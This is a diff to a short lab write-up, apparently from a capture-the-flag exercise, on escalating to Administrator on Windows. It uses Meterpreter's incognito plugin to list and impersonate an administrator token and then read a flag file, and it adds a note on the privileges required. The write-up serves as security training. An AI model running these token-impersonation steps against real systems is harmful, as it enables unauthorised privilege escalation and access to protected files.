@@ -7,16 +7,23 @@ There are two privileges that can be exploited for this technique: SeImpersonate
 ## Privilage Escalation(Windows) Impersonate access Token
 ### We start with an initial access
 Let's check that we can't read a file.txt**<br>
- - cat C:\\Users\\Administrator\\Desktop\\flag.txt
+ - cat C:\\Users\\Administrator\\Desktop\\flag.txt <br>
 <img src="file.png" width=60% height="auto"><br>
 We cannot read the flag with current privilege. The flag is located into the Administrator’s Desktop folder. Load incognito plugin and check all available tokens.
  - load incognito
- - list_tokens -u
+ - list_tokens -u <br>
 <img src="token.png" width=60% height="auto"><br>
 We can notice that the Administrator user token is available. we will Impersonate the Administrator user token
  - impersonate_token ATTACKDEFENSE\\Administrator 
  - getuid
- - cat C:\\Users\\Administrator\\Desktop\\flag.txt
+ - cat C:\\Users\\Administrator\\Desktop\\flag.txt <br>
 <img src="impersonate.png" width=60% height="auto"><br>
 Successfull!<br>
 <img src="ok.png" width=60% height="auto"><br>
+
+### Advice
+The user must have these privileges: SeAssignPrimaryKey, SeCreateToken e SeImpersonatePrivilage <br>
+Use the command getprivs to check it. 
+
+
+<b>Xiao Li Savio Feng</b>
